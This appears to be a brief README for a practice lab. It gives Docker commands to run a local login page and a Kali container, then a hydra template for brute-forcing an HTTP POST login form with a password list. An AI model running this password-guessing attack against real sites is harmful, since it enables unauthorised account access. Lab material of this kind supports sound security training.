# login-bruteforce

docker build -t login-bruteforce .
docker run -d -p 8080:80 login-bruteforce

Kali:
docker run -it --name kalilinux --network=host fabiosantos/kalilinux

hydra -l USERNAME -P LISTA URL http-post-form "URL:username=^USER^&password=^PASS^:S=302"